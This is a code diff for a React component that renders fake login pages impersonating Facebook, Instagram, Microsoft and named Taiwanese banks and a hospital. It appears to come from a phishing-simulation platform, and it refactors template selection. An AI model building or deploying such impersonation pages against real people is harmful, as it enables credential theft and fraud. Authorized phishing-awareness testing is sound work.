@@ -1,6 +1,11 @@
 "use client";
 
-import { getPhishingComponent } from "@/components/phishing";
+import FakeLoginForm from "@/components/phishing/FakeLoginForm";
+import FacebookLogin from "@/components/phishing/FacebookLogin";
+import InstagramLogin from "@/components/phishing/InstagramLogin";
+import EsunBankLogin from "@/components/phishing/EsunBankLogin";
+import CmuHospitalLogin from "@/components/phishing/CmuHospitalLogin";
+import TaichungBankLogin from "@/components/phishing/TaichungBankLogin";
 import { usePhishingSubmit } from "@/components/phishing/usePhishingSubmit";
 
 interface Props {
@@ -11,22 +16,27 @@ interface Props {
 }
 
 export default function PhishingPageRenderer({ token, slug, builtIn, htmlBody }: Props) {
-  // Built-in template: render the corresponding React component
-  if (builtIn) {
-    const Component = getPhishingComponent(slug);
-    if (Component) {
-      return <Component token={token} />;
-    }
-  }
-
   // Custom HTML template (future feature)
-  if (htmlBody) {
+  if (!builtIn && htmlBody) {
     return <CustomHtmlPhishing token={token} htmlBody={htmlBody} />;
   }
 
-  // Fallback to Microsoft
-  const Fallback = getPhishingComponent("microsoft")!;
-  return <Fallback token={token} />;
+  // Built-in templates
+  switch (slug) {
+    case "facebook":
+      return <FacebookLogin token={token} />;
+    case "instagram":
+      return <InstagramLogin token={token} />;
+    case "esun-bank":
+      return <EsunBankLogin token={token} />;
+    case "cmu-hospital":
+      return <CmuHospitalLogin token={token} />;
+    case "taichung-bank":
+      return <TaichungBankLogin token={token} />;
+    case "microsoft":
+    default:
+      return <FakeLoginForm token={token} />;
+  }
 }
 
 function CustomHtmlPhishing({ token, htmlBody }: { token: string; htmlBody: string }) {
